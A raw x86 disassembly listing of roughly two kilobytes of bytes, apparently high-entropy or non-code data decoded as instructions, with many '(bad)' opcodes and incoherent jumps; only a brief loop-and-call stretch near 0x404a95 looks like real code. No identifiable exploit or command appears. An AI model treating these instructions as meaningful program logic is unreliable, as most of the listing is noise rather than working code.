  4047a5:	xchg   DWORD PTR [edx-0x326cf1ae],ecx
  4047ab:	jg     0x404800
  4047ad:	outs   dx,DWORD PTR cs:[esi]
  4047af:	addr16 gs aaa 
  4047b2:	xlat   BYTE PTR ds:[ebx]
  4047b3:	xor    dl,al
  4047b5:	in     al,0xa0
  4047b7:	shl    DWORD PTR [esi+0x23],cl
  4047ba:	call   0xe33ab087
  4047bf:	mov    eax,ds:0x1e3b19f6
  4047c4:	jno    0x4047eb
  4047c6:	add    BYTE PTR [ebx-0x3544f391],al
  4047cc:	xor    eax,0x526a95fd
  4047d1:	loopne 0x404848
  4047d3:	ret    
  4047d4:	arpl   WORD PTR [eax-0x6e],sp
  4047d7:	cmc    
  4047d8:	inc    edx
  4047d9:	jmp    0x4047f7
  4047db:	fistp  QWORD PTR [eax+eax*1-0x561603fc]
  4047e2:	ss jae 0x40483e
  4047e5:	(bad)  
  4047e7:	sbb    al,0x1b
  4047e9:	aam    0x76
  4047eb:	cmp    al,0x29
  4047ed:	dec    eax
  4047ee:	(bad)  
  4047ef:	mov    bl,0x53
  4047f1:	cmp    ebx,DWORD PTR [esi+esi*2]
  4047f4:	sub    DWORD PTR [ecx],esp
  4047f6:	dec    ebx
  4047f7:	jle    0x4047b5
  4047f9:	sar    DWORD PTR [edx-0x5d705054],0x7c
  404800:	jo     0x4047ea
  404802:	jl     0x40481c
  404804:	inc    edi
  404805:	retf   0x2162
  404808:	data16 fdiv DWORD PTR [edi-0x2b]
  40480c:	ret    
  40480d:	dec    eax
  40480e:	inc    esp
  40480f:	retf   0x47af
  404812:	mov    ecx,0x13e4659b
  404817:	das    
  404818:	mov    edx,0xfdd3ff77
  40481d:	jne    0x4047bb
  40481f:	test   dl,dh
  404821:	(bad)  
  404822:	and    esp,DWORD PTR [ecx]
  404824:	(bad)  
  404825:	cli    
  404826:	fucomp st(5)
  404828:	dec    esp
  404829:	inc    ecx
  40482a:	cld    
  40482b:	pop    esp
  40482c:	(bad)  
  40482e:	jmp    0x87ab:0x1e6d451a
  404835:	add    DWORD PTR [edx-0x39],ebp
  404838:	mov    eax,ds:0x4ecfe738
  40483d:	xchg   ebx,eax
  40483e:	pop    esi
  40483f:	push   esi
  404840:	dec    esi
  404841:	inc    ebp
  404842:	lea    ebx,[eax-0x21]
  404845:	ins    DWORD PTR es:[edi],dx
  404846:	iret   
  404847:	push   esp
  404848:	pop    ebx
  404849:	xor    ch,BYTE PTR [ebp+eiz*8+0x63]
  40484d:	mov    DWORD PTR [eax],ebp
  40484f:	loop   0x4047f9
  404851:	pop    eax
  404852:	xlat   BYTE PTR ds:[ebx]
  404853:	out    dx,al
  404854:	add    esi,DWORD PTR [edx+0x10a8f37e]
  40485a:	mov    WORD PTR [ebx-0x330c231],es
  404860:	test   bh,cl
  404862:	adc    BYTE PTR [esi+0x18],al
  404865:	xchg   bh,dh
  404867:	mov    esp,0x9a93ca71
  40486c:	mov    ch,0x56
  40486e:	dec    eax
  40486f:	pop    ebx
  404870:	pop    ds
  404871:	sub    cl,BYTE PTR [ebp-0x2c90e63]
  404877:	shl    DWORD PTR [eax],cl
  404879:	outs   dx,BYTE PTR ds:[esi]
  40487a:	inc    eax
  40487b:	push   ebx
  40487c:	aas    
  40487d:	pushf  
  40487e:	shr    BYTE PTR [ebx+ebp*1-0x16],cl
  404882:	loope  0x404813
  404884:	jg     0x40487b
  404886:	jbe    0x40488d
  404888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404889:	mov    bl,0x8f
  40488b:	call   0xa0:0x3605978d
  404892:	xor    dl,ch
  404894:	dec    ebp
  404895:	retf   0xf5c6
  404898:	xchg   edx,eax
  404899:	pop    ebx
  40489a:	stos   DWORD PTR es:[edi],eax
  40489b:	rcr    BYTE PTR [edx-0x37c1482d],1
  4048a1:	imul   eax,DWORD PTR [ebx+0x3804400a],0x12
  4048a8:	mov    cl,0xe
  4048aa:	push   ss
  4048ab:	fwait
  4048ac:	ret    0xd600
  4048af:	sbb    BYTE PTR [eax+0x7b],bh
  4048b2:	std    
  4048b3:	fcmovnu st,st(2)
  4048b5:	or     dl,BYTE PTR [edi]
  4048b7:	mov    ds:0x8a4e4a0a,al
  4048bc:	aad    0x79
  4048be:	mov    esp,0xc1214bd0
  4048c3:	jl     0x4048a4
  4048c5:	out    dx,al
  4048c6:	add    DWORD PTR [edx+0x7fc29fa3],edi
  4048cc:	stos   DWORD PTR es:[edi],eax
  4048cd:	inc    eax
  4048ce:	mov    ah,0x82
  4048d0:	lods   al,BYTE PTR ds:[esi]
  4048d1:	add    al,0x45
  4048d3:	or     ebp,DWORD PTR [edi+ebp*4]
  4048d6:	cli    
  4048d7:	arpl   WORD PTR [ecx],ax
  4048d9:	dec    ecx
  4048da:	imul   eax,DWORD PTR [eax],0x18
  4048dd:	push   eax
  4048de:	popf   
  4048df:	leave  
  4048e0:	add    al,0x37
  4048e2:	ret    0xe4d9
  4048e5:	sub    cl,BYTE PTR [eax+0x38]
  4048e8:	push   esp
  4048e9:	inc    edi
  4048ea:	and    BYTE PTR [esi],al
  4048ec:	and    BYTE PTR [edi],0x29
  4048ef:	pop    ebp
  4048f0:	or     ecx,esi
  4048f2:	cmp    BYTE PTR [edx-0x3ff1fa03],dl
  4048f8:	push   DWORD PTR [edi-0x2e]
  4048fb:	ds dec ebx
  4048fd:	bound  esp,QWORD PTR [esi]
  4048ff:	aad    0x4
  404901:	push   edi
  404902:	aas    
  404903:	ins    DWORD PTR es:[edi],dx
  404904:	inc    ebx
  404905:	push   ecx
  404906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404907:	std    
  404908:	pop    edi
  404909:	ins    BYTE PTR es:[edi],dx
  40490a:	sbb    ebp,DWORD PTR ds:0xe9f24aee
  404910:	push   ss
  404911:	adc    cl,BYTE PTR [esi]
  404913:	imul   eax,DWORD PTR [esi+0x66e3c9bc],0xbac6cab1
  40491d:	mov    ch,0x76
  40491f:	or     DWORD PTR [edx+0x232545e6],ebx
  404925:	bound  esp,QWORD PTR [ecx-0x213173a1]
  40492b:	jne    0x4048f0
  40492d:	gs addr16 push esp
  404930:	sbb    eax,0x152ca16d
  404935:	lock dec esp
  404937:	cmc    
  404938:	pop    esp
  404939:	fmul   DWORD PTR [edi-0x59]
  40493c:	ds ss ftst 
  404940:	jb     0x404911
  404942:	daa    
  404943:	ret    0x32e1
  404946:	mov    ds:0x7c4ae46a,eax
  40494b:	xor    DWORD PTR [ecx+eiz*1-0x38],0x376d6704
  404953:	jne    0x4049af
  404955:	mov    DWORD PTR [ecx-0x54],ebp
  404958:	addr16 mov ds:0x22a8,al
  40495c:	pushf  
  40495d:	or     ah,BYTE PTR [edi-0x5f]
  404960:	jl     0x40492f
  404962:	in     eax,0x94
  404964:	fs jmp 0x4563:0x82ac382b
  40496c:	inc    esp
  40496d:	jns    0x40494b
  40496f:	scas   eax,DWORD PTR es:[edi]
  404970:	xlat   BYTE PTR ds:[ebx]
  404971:	imul   esp,DWORD PTR [ebx],0xb11e7eca
  404977:	test   DWORD PTR [ecx-0x63],0xb4a7a42f
  40497e:	cli    
  40497f:	jno    0x40497f
  404981:	xor    dh,BYTE PTR [edx+0x57faf34c]
  404987:	fcomp  QWORD PTR [ecx]
  404989:	in     al,dx
  40498a:	or     eax,0x1a7d0e88
  40498f:	xchg   DWORD PTR [esi],ebx
  404991:	rol    DWORD PTR [ebx-0x795660a8],0x85
  404998:	(bad)  
  40499a:	sti    
  40499b:	xor    ch,BYTE PTR [eax]
  40499d:	inc    edi
  40499e:	xor    eax,0xffffffb9
  4049a1:	dec    esi
  4049a2:	in     eax,0x74
  4049a4:	push   0xe
  4049a6:	jge    0x4049ba
  4049a8:	or     eax,0xaf077ad4
  4049ad:	adc    DWORD PTR [eax],0x64
  4049b0:	imul   edx,eax,0xffffffdf
  4049b3:	fbstp  TBYTE PTR [ebp-0x7c67aa16]
  4049b9:	cwde   
  4049ba:	xchg   esi,eax
  4049bb:	mov    ds:0x638573b,eax
  4049c0:	mov    eax,0x96cef2d3
  4049c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c6:	aas    
  4049c7:	imul   edx,esi,0xffffffa6
  4049ca:	aad    0xc4
  4049cc:	sbb    al,0x78
  4049ce:	push   cs
  4049cf:	pusha  
  4049d0:	or     DWORD PTR [eax+0x5c],esi
  4049d3:	pop    ebx
  4049d4:	hlt    
  4049d5:	cli    
  4049d6:	xchg   esi,esp
  4049d8:	mov    edi,0xafa19665
  4049dd:	cmp    esi,0xba8932a
  4049e3:	sbb    eax,0xc695c184
  4049e8:	lods   eax,DWORD PTR ds:[esi]
  4049e9:	icebp  
  4049ea:	shl    BYTE PTR [edi+ecx*8-0x63053995],1
  4049f1:	ficom  DWORD PTR [esi+0x39c33073]
  4049f7:	mov    BYTE PTR [esi],dl
  4049f9:	fs hlt 
  4049fb:	(bad)  
  4049fd:	adc    al,0xeb
  4049ff:	jmp    0x40499a
  404a01:	test   DWORD PTR [edx-0x67],ebx
  404a04:	mov    bh,BYTE PTR [ebp-0x60]
  404a07:	stos   BYTE PTR es:[edi],al
  404a08:	pushf  
  404a09:	(bad)  
  404a0b:	dec    esi
  404a0c:	sbb    BYTE PTR [esi],ch
  404a0e:	cmp    BYTE PTR [ebp-0x14],dh
  404a11:	(bad)  
  404a12:	icebp  
  404a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a14:	inc    esp
  404a15:	enter  0x34d8,0xbe
  404a19:	xchg   ebp,eax
  404a1a:	cli    
  404a1b:	sub    ebp,DWORD PTR [ebp-0x2523ca6d]
  404a21:	push   0xee944f3e
  404a26:	lock jg 0x404a79
  404a29:	mov    ah,ah
  404a2b:	rol    DWORD PTR ds:0x76d060a8,1
  404a31:	add    BYTE PTR [edi],al
  404a33:	fimul  DWORD PTR [ecx+0x37]
  404a36:	mov    ebx,0x141b9058
  404a3b:	inc    esi
  404a3c:	(bad)  
  404a3e:	xor    ebp,DWORD PTR [esi+0x4e]
  404a41:	sub    DWORD PTR [eax],edi
  404a43:	mov    bh,dl
  404a45:	mov    ebx,0xd19612c7
  404a4a:	fsubr  DWORD PTR [ecx+0x43ab3cec]
  404a50:	push   cs
  404a51:	sub    al,dl
  404a53:	retf   
  404a54:	sahf   
  404a55:	and    ecx,DWORD PTR [ebx-0x2ecad678]
  404a5b:	xchg   esp,esp
  404a5d:	cmp    al,0xf1
  404a5f:	aaa    
  404a60:	lahf   
  404a61:	jo     0x404a42
  404a63:	clc    
  404a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a65:	imul   eax,DWORD PTR [ecx],0x6d240fbd
  404a6b:	rcl    DWORD PTR [ecx-0x107bcff6],0x35
  404a72:	or     al,0x2e
  404a74:	push   ebp
  404a75:	push   0x51881d68
  404a7a:	mov    ds:0xa4a5fa7a,al
  404a7f:	xor    DWORD PTR [edi-0x76],edi
  404a82:	in     eax,dx
  404a83:	test   al,0xc
  404a85:	mov    ebx,0x89e8d928
  404a8a:	fcomp  QWORD PTR [eax+ebp*4+0x3dfb8e68]
  404a91:	cmp    DWORD PTR [ebp+0x3],ebx
  404a94:	(bad)  
  404a95:	xor    ecx,DWORD PTR ds:0x42a331
  404a9b:	mov    DWORD PTR [ebp-0x30],eax
  404a9e:	or     DWORD PTR ds:0x42a345,edi
  404aa4:	mov    eax,DWORD PTR [ebp-0x28]
  404aa7:	and    DWORD PTR ds:0x42a3bd,0x0
  404ab1:	jmp    0x404ac3
  404ab6:	mov    ecx,DWORD PTR ds:0x42a3bd
  404abc:	inc    ecx
  404abd:	mov    DWORD PTR ds:0x42a3bd,ecx
  404ac3:	cmp    DWORD PTR ds:0x42a3bd,0x1a
  404aca:	jae    0x404aed
  404ad0:	cmp    DWORD PTR ds:0x42a3bd,0x27
  404ad7:	jne    0x404ae8
  404add:	push   0x42a635
  404ae2:	call   DWORD PTR ds:0x425350
  404ae8:	jmp    0x404ab6
  404aed:	xor    eax,esi
  404aef:	adc    DWORD PTR ds:0x42a3f9,0x646a
  404af9:	add    eax,edi
  404afb:	jmp    0x405006
  404b00:	enter  0xd1ce,0xd2
  404b04:	rcl    ecx,1
  404b06:	iret   
  404b07:	shl    BYTE PTR [eax+0xbcb9317],cl
  404b0d:	xor    BYTE PTR [ebp+0x78323633],0x78
  404b14:	push   0x7c
  404b16:	js     0x404b90
  404b18:	inc    eax
  404b19:	add    ah,dh
  404b1b:	test   eax,0xb7e49e6b
  404b20:	leave  
  404b21:	outs   dx,DWORD PTR ds:[esi]
  404b22:	das    
  404b23:	aaa    
  404b24:	test   BYTE PTR [ecx],dh
  404b26:	jne    0x404b45
  404b28:	jnp    0x404b20
  404b2a:	sbb    DWORD PTR [edx-0x52090454],ebx
  404b30:	das    
  404b31:	imul   esi,DWORD PTR [eax+edx*8-0x7c],0x45
  404b36:	sub    eax,0xf1d672da
  404b3b:	push   edi
  404b3c:	push   eax
  404b3d:	add    al,0xf1
  404b3f:	adc    esi,DWORD PTR [esp+eiz*8-0x6b5a9eab]
  404b46:	je     0x404ba7
  404b48:	xchg   ebp,eax
  404b49:	mov    ecx,0x4eb0c9d5
  404b4e:	mov    eax,0xd77216d2
  404b53:	ret    
  404b54:	scas   al,BYTE PTR es:[edi]
  404b55:	xchg   edx,eax
  404b56:	jge    0x404b44
  404b58:	aas    
  404b59:	jmp    0xcb82:0x9adfcc4e
  404b60:	jo     0x404b46
  404b62:	lods   eax,DWORD PTR ds:[esi]
  404b63:	loop   0x404b4b
  404b65:	inc    BYTE PTR [edi]
  404b67:	(bad)  
  404b68:	jns    0x404b3a
  404b6a:	add    eax,0x7b321934
  404b6f:	mov    al,0x23
  404b71:	push   0x2570d568
  404b76:	mov    bh,0xbb
  404b78:	not    al
  404b7a:	mov    dh,BYTE PTR [esi+0x138095e2]
  404b80:	jns    0x404b81
  404b82:	push   ss
  404b83:	(bad)  [esp+edx*4]
  404b86:	iret   
  404b87:	pop    es
  404b88:	jne    0x404bbc
  404b8a:	aad    0xdf
  404b8c:	cmp    dl,bh
  404b8e:	dec    ebx
  404b8f:	addr16 dec esp
  404b91:	lahf   
  404b92:	jae    0x404b74
  404b94:	pop    ss
  404b95:	jecxz  0x404b65
  404b97:	pop    edi
  404b98:	cmc    
  404b99:	jae    0x404c19
  404b9b:	test   DWORD PTR [edi+0x16969524],0x4b8f003c
  404ba5:	mov    ch,0x44
  404ba7:	gs stc 
  404ba9:	ret    
  404baa:	pop    ebx
  404bab:	pop    ds
  404bac:	dec    edi
  404bad:	adc    dh,BYTE PTR [edi-0x6c]
  404bb0:	or     al,0x97
  404bb2:	or     esi,DWORD PTR [eax-0x36525e2d]
  404bb8:	and    bh,BYTE PTR ds:0xa1f644a9
  404bbe:	mov    esp,0x2fd8fa6b
  404bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bc4:	mov    ds:0x2c645f7a,al
  404bc9:	jne    0x404b66
  404bcb:	int3   
  404bcc:	mov    al,ds:0x8902fd3a
  404bd1:	into   
  404bd2:	sbb    bh,BYTE PTR [edi+0x704668a]
  404bd8:	sbb    BYTE PTR [ebx+0x6d],0xc4
  404bdc:	je     0x404bee
  404bde:	jp     0x404bee
  404be0:	push   0xffffffb9
  404be2:	cmp    DWORD PTR [ebx],esi
  404be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404be5:	xor    al,0x40
  404be7:	pop    edi
  404be8:	xor    ebx,ecx
  404bea:	xchg   ecx,eax
  404beb:	aad    0x26
  404bed:	pusha  
  404bee:	sbb    edx,DWORD PTR [edi]
  404bf0:	ret    
  404bf1:	std    
  404bf2:	jae    0x404c3b
  404bf4:	addr16 mov eax,ds:0xa0db
  404bf8:	pop    esp
  404bf9:	fxtract 
  404bfb:	fstp   TBYTE PTR [eax-0x7e]
  404bfe:	jl     0x404c53
  404c00:	(bad)  
  404c01:	mov    ah,0xaf
  404c03:	jecxz  0x404bbf
  404c05:	jmp    0xe0f98876
  404c0a:	mov    BYTE PTR [eax+0x3870801f],bh
  404c10:	jmp    0x404b9c
  404c12:	pop    es
  404c13:	jmp    0x45c11424
  404c18:	and    eax,0xbef328a0
  404c1d:	ficom  DWORD PTR [edx+0x7c]
  404c20:	rsqrtps xmm4,XMMWORD PTR [esp+esi*1+0x37d836bb]
  404c28:	(bad)  [ebp-0x652281d]
  404c2e:	push   ebx
  404c2f:	mov    cl,0x68
  404c31:	jecxz  0x404c94
  404c33:	xchg   ebx,eax
  404c34:	das    
  404c35:	pop    eax
  404c36:	into   
  404c37:	adc    eax,0x16da6a37
  404c3c:	or     ecx,DWORD PTR [edi+0xc69f09e]
  404c42:	jecxz  0x404bfe
  404c44:	add    esi,DWORD PTR [ecx-0x4c3b0b43]
  404c4a:	pop    ebx
  404c4b:	add    bh,BYTE PTR [edi-0x37]
  404c4e:	call   0x7ac5:0x3fc23f49
  404c55:	loope  0x404c9f
  404c57:	lea    eax,[ebx-0x2b883400]
  404c5d:	or     eax,0xac366969
  404c62:	out    dx,eax
  404c63:	pop    edi
  404c64:	cdq    
  404c65:	fild   WORD PTR [ebp+0x63]
  404c68:	sub    DWORD PTR [ebx-0xf],ebx
  404c6b:	cwde   
  404c6c:	mov    esp,0x17b2f337
  404c71:	xlat   BYTE PTR ds:[ebx]
  404c72:	push   esp
  404c73:	in     al,0x46
  404c75:	lahf   
  404c76:	stos   BYTE PTR es:[di],al
  404c78:	cs mov edx,esi
  404c7b:	ins    BYTE PTR es:[edi],dx
  404c7c:	cmp    BYTE PTR [ebx+0x73794eed],ch
  404c82:	ret    
  404c83:	scas   al,BYTE PTR es:[edi]
  404c84:	loop   0x404c16
  404c86:	inc    edi
  404c87:	push   esi
  404c88:	daa    
  404c89:	dec    ecx
  404c8a:	push   eax
  404c8b:	lods   al,BYTE PTR ds:[esi]
  404c8c:	xchg   ebp,eax
  404c8d:	scas   eax,DWORD PTR es:[edi]
  404c8e:	hlt    
  404c8f:	pop    esp
  404c90:	xor    al,0xab
  404c92:	fstp   TBYTE PTR [esi]
  404c94:	(bad)  
  404c96:	mov    esp,0xb5ebecc5
  404c9b:	outs   dx,BYTE PTR ds:[esi]
  404c9c:	fldenv [esi-0x7b4edf45]
  404ca2:	cmp    DWORD PTR [ebx+0x31],ecx
  404ca5:	pop    bp
  404ca7:	or     eax,DWORD PTR [eax+0x2c]
  404caa:	imul   edi,DWORD PTR [edi-0x7bce552b],0xb144f3dd
  404cb4:	cmp    eax,0x30cf9e77
  404cb9:	xchg   edx,eax
  404cba:	xchg   esi,eax
  404cbb:	xchg   edi,eax
  404cbc:	mov    dh,0xc8
  404cbe:	mov    ah,0x67
  404cc0:	sub    esi,DWORD PTR [ecx]
  404cc2:	das    
  404cc3:	and    ch,BYTE PTR [esi-0x10]
  404cc6:	jo     0x404d0d
  404cc8:	pusha  
  404cc9:	int    0x60
  404ccb:	mov    ch,0xc5
  404ccd:	or     eax,0x7a0422a3
  404cd2:	test   DWORD PTR [eax-0x69c9047f],ecx
  404cd8:	xchg   DWORD PTR ds:0x3ddbcdf9,ebp
  404cde:	lock push cs
  404ce0:	aad    0xa2
  404ce2:	daa    
  404ce3:	dec    edx
  404ce4:	retf   0xf1ae
  404ce7:	push   0xe7c0aa91
  404cec:	or     al,0x7f
  404cee:	das    
  404cef:	mov    esp,0x8e0584a3
  404cf4:	imul   ebp,DWORD PTR [esi-0x7fe5ec9d],0x56d25ae
  404cfe:	enter  0xcd16,0x16
  404d02:	outs   dx,DWORD PTR ds:[esi]
  404d03:	(bad)  
  404d06:	xchg   ebp,eax
  404d07:	test   BYTE PTR [edi+ecx*2-0x6b57b73d],dl
  404d0e:	sbb    BYTE PTR [ebx-0x6ee44005],dl
  404d14:	int3   
  404d15:	cld    
  404d16:	cli    
  404d17:	push   ds
  404d18:	dec    ecx
  404d19:	scas   al,BYTE PTR es:[edi]
  404d1a:	je     0x404d1c
  404d1c:	dec    ebx
  404d1d:	sub    ecx,esp
  404d1f:	push   ebp
  404d20:	imul   ebp,DWORD PTR [ebp-0x3797388b],0x220cb5a8
  404d2a:	dec    eax
  404d2b:	ror    DWORD PTR ds:0x7a327d66,1
  404d31:	ins    DWORD PTR es:[edi],dx
  404d32:	ins    DWORD PTR es:[edi],dx
  404d33:	and    esi,0xffffff94
  404d36:	sti    
  404d37:	mov    BYTE PTR [edx+0x36],cl
  404d3a:	addr16 jle 0x404cea
  404d3d:	cs push ss
  404d3f:	popa   
  404d40:	outs   dx,BYTE PTR ds:[esi]
  404d41:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  404d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d44:	dec    esp
  404d45:	inc    esp
  404d46:	cs inc edi
  404d48:	mov    dl,0x81
  404d4a:	sahf   
  404d4b:	xor    ah,BYTE PTR [edx+0x48d94652]
  404d51:	aad    0xda
  404d53:	xor    eax,0xc2a2c9e6
  404d58:	add    esp,DWORD PTR [ebx-0x481cf750]
  404d5e:	push   ecx
  404d5f:	adc    al,0x82
  404d61:	mov    ecx,fs
  404d63:	mov    WORD PTR [ebp-0x55],es
  404d66:	test   eax,0x9115874a
  404d6b:	jne    0x404d8d
  404d6d:	xor    BYTE PTR ss:[esi+0x33bb2dc],dl
  404d74:	adc    BYTE PTR [edx+0x6a],dl
  404d77:	pop    ebp
  404d78:	lahf   
  404d79:	(bad)  
  404d7a:	stc    
  404d7b:	push   ebx
  404d7c:	adc    eax,0x3959817b
  404d81:	mov    edx,0x76693d2b
  404d86:	cwde   
  404d87:	sub    BYTE PTR [ecx+0x295cd7e4],bl
  404d8d:	xchg   edx,eax
  404d8e:	rcl    ah,1
  404d90:	sub    al,0xd1
  404d92:	cmp    ebp,DWORD PTR [edx+0x3bc2d09]
  404d98:	sar    eax,0x6c
  404d9b:	push   eax
  404d9c:	fimul  DWORD PTR [edi-0xe0a635e]
  404da2:	loop   0x404d69
  404da4:	add    cl,BYTE PTR [edi+edx*2+0x38de36d9]
  404dab:	js     0x404dcd
  404dad:	xchg   ebp,eax
  404dae:	sbb    eax,0xfd6644
  404db3:	ficom  DWORD PTR [ebx-0x2d]
  404db6:	mov    al,ds:0x7564f2c7
  404dbb:	(bad)  
  404dbc:	dec    edx
  404dbd:	push   esp
  404dbe:	test   esi,ecx
  404dc0:	pop    ecx
  404dc1:	xor    DWORD PTR [edi-0x3bfb2925],edi
  404dc7:	ret    
  404dc8:	aad    0x56
  404dca:	cmp    al,0x1b
  404dcc:	pusha  
  404dcd:	cmc    
  404dce:	arpl   WORD PTR [esi+0x1f6a4a54],si
  404dd4:	into   
  404dd5:	dec    ebp
  404dd6:	jns    0x404da4
  404dd8:	xchg   edi,eax
  404dd9:	inc    edi
  404dda:	mov    ebp,0xb8246a02
  404ddf:	out    0x19,eax
  404de1:	std    
  404de2:	ror    esi,1
  404de4:	mov    dl,0xbc
  404de6:	ror    BYTE PTR [ebx-0x2e93afad],cl
  404dec:	call   DWORD PTR [eax-0x35]
  404def:	pop    ecx
  404df0:	sbb    cl,al
  404df2:	mov    al,ds:0x8aa83a5a
  404df7:	push   0x45
  404df9:	cmp    DWORD PTR [edi-0x5e],esi
  404dfc:	shr    DWORD PTR [eax],cl
  404dfe:	xlat   BYTE PTR ds:[ebx]
  404dff:	push   ds
  404e00:	in     eax,dx
  404e01:	cmp    DWORD PTR [eax+0x54],0xffffffa7
  404e05:	(bad)  
  404e07:	ret    
  404e08:	shl    ah,1
  404e0a:	aaa    
  404e0b:	xchg   ebp,eax
  404e0c:	popa   
  404e0d:	sbb    eax,0xd33a62cc
  404e12:	fiadd  DWORD PTR [eax+0x66]
  404e15:	ins    DWORD PTR es:[edi],dx
  404e16:	es jecxz 0x404e4f
  404e19:	sbb    BYTE PTR [edx+eax*2],bl
  404e1c:	mov    dh,0x42
  404e1e:	dec    ecx
  404e1f:	adc    bh,BYTE PTR [esi+edi*1+0x7ea05ead]
  404e26:	jnp    0x404dcc
  404e28:	rol    DWORD PTR [ebx-0x34],cl
  404e2b:	popf   
  404e2c:	pop    ds
  404e2d:	pushf  
  404e2e:	inc    edx
  404e2f:	mov    ecx,DWORD PTR cs:[ebx-0x4d]
  404e33:	adc    al,BYTE PTR [edi-0x5f9253b9]
  404e39:	add    BYTE PTR ds:0x389e256b,0x6f
  404e40:	mov    eax,0x99005866
  404e45:	xchg   edx,eax
  404e46:	and    al,0x27
  404e48:	mov    dh,0xae
  404e4a:	jb     0x404e48
  404e4c:	or     edx,DWORD PTR [eax+eiz*2+0x45]
  404e50:	stc    
  404e51:	jo     0x404e79
  404e53:	aam    0xff
  404e55:	mov    ebp,0x2b6b8c30
  404e5a:	int    0x51
  404e5c:	sbb    DWORD PTR [esi+0x451cb8cd],ebx
  404e62:	mov    ds:0x99189d00,al
  404e67:	sbb    ecx,DWORD PTR [esi+ebx*1]
  404e6a:	cmp    ebx,eax
  404e6c:	jbe    0x404ece
  404e6e:	addr16 push cs
  404e70:	push   eax
  404e71:	add    DWORD PTR [ebx+esi*4],0xfffffff2
  404e75:	out    dx,eax
  404e76:	fwait
  404e77:	(bad)  
  404e78:	or     eax,0xfb44a17f
  404e7d:	add    al,0xc0
  404e7f:	ins    DWORD PTR es:[edi],dx
  404e80:	cwde   
  404e81:	and    eax,0xffdd2777
  404e86:	cmp    BYTE PTR [ebx+0xbbc7223],0xa0
  404e8d:	dec    ebx
  404e8e:	mov    ebx,0x579fb46b
  404e93:	into   
  404e94:	mov    ah,0x47
  404e96:	sbb    al,0x79
  404e98:	sbb    edi,esp
  404e9a:	aas    
  404e9b:	lods   eax,DWORD PTR ds:[esi]
  404e9c:	dec    edi
  404e9d:	xchg   DWORD PTR [ebx],esi
  404e9f:	repz sbb DWORD PTR [eax-0x5f013515],ebp
  404ea6:	clc    
  404ea7:	pop    ebp
  404ea8:	lahf   
  404ea9:	scas   al,BYTE PTR es:[edi]
  404eaa:	std    
  404eab:	or     DWORD PTR [ecx-0x389dd89d],ebp
  404eb1:	loopne 0x404eac
  404eb3:	loope  0x404e3a
  404eb5:	(bad)  
  404eb6:	xor    DWORD PTR [eax-0x403efbce],eax
  404ebc:	mov    ah,0x28
  404ebe:	fs dec esi
  404ec0:	dec    ebx
  404ec1:	adc    eax,0xf3097efc
  404ec6:	je     0x404ec9
  404ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec9:	(bad)  
  404eca:	pop    ecx
  404ecb:	lea    ebp,[ebp+0x46]
  404ece:	leave  
  404ecf:	js     0x404e7e
  404ed1:	dec    esp
  404ed2:	mov    ecx,0x6e6681c6
  404ed7:	pop    es
  404ed8:	pusha  
  404ed9:	in     eax,0xb2
  404edb:	adc    DWORD PTR [eax],eax
  404edd:	adc    cl,dl
  404edf:	xchg   esp,eax
  404ee1:	imul   eax,DWORD PTR [esi],0xffffffb8
  404ee4:	xchg   edx,eax
  404ee5:	or     BYTE PTR [edi],0x8a
  404ee8:	(bad)  
  404eea:	sbb    DWORD PTR ds:0x42520fa8,0xa4feac08
  404ef4:	and    al,0xbe
  404ef6:	jns    0x404f14
  404ef8:	inc    esp
  404ef9:	mov    BYTE PTR [ebp-0x52e6ce62],al
  404eff:	sbb    DWORD PTR [edi+0x48],eax
  404f02:	ss push es
  404f04:	lds    ecx,FWORD PTR [edx-0x4e0bc4a0]
  404f0a:	ss nop
  404f0c:	dec    ecx
  404f0d:	or     edi,DWORD PTR [ebx+0x231ee33c]
  404f13:	stc    
  404f14:	mov    esp,0x2858679c
  404f19:	sahf   
  404f1a:	mov    dh,0xf0
  404f1c:	out    dx,al
  404f1d:	sahf   
  404f1e:	push   edi
  404f1f:	mov    dl,0xc9
  404f21:	mov    ecx,0x73b9af63
  404f26:	push   ebp
  404f27:	pop    esi
  404f28:	(bad)  [esi+edx*1]
  404f2b:	and    bh,ch
  404f2d:	and    BYTE PTR ds:0xcb79c61f,bl
  404f33:	iret   
  404f34:	ret    
  404f35:	xchg   ebp,eax
  404f36:	sahf   
  404f37:	rcl    DWORD PTR [ebx+0x78],0x2e
  404f3b:	jmp    0x404f02
  404f3d:	sub    DWORD PTR ds:0xcf04d10,eax
  404f43:	and    eax,0x11c19b30
  404f48:	daa    
  404f49:	mov    esi,0xabc36d37
  404f4e:	push   edx
  404f4f:	jg     0x404edc
  404f51:	xor    DWORD PTR [eax-0x7d],esp
  404f54:	push   cs
  404f55:	in     al,dx
  404f56:	or     al,0x83
  404f58:	mul    DWORD PTR [edi+0x55]
  404f5b:	xor    al,0x17
  404f5d:	ins    DWORD PTR es:[edi],dx
  404f5e:	and    ebp,DWORD PTR [ebx-0x7fc15422]
  404f64:	inc    edx
  404f65:	mov    eax,eax
  404f67:	mov    bl,0xb2
  404f69:	mul    BYTE PTR [ebp+0x8fbd54e]
  404f6f:	mov    esi,0x7d88425d
  404f74:	push   ss
  404f75:	lahf   
  404f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f77:	(bad)  
  404f78:	jl     0x404f91
  404f7a:	scas   eax,DWORD PTR es:[edi]
  404f7b:	clc    
  404f7c:	mov    ecx,esi
  404f7e:	adc    BYTE PTR [edx-0x1d],al
  404f81:	sub    al,0xe0
  404f83:	cmp    al,0xcf
  404f85:	mov    edi,0x3a64609b
  404f8a:	in     eax,0x65
  404f8c:	and    cl,BYTE PTR [edx]
  404f8e:	les    ebp,FWORD PTR [esi-0x3f]
  404f91:	pop    ss
  404f92:	ds dec eax
  404f94:	mov    dh,0xab
  404f96:	in     al,0x92
  404f98:	add    al,BYTE PTR [ebx-0x2e67e063]
  404f9e:	lock cmp al,0x2e
  404fa1:	repz int3 
  404fa3:	div    dl
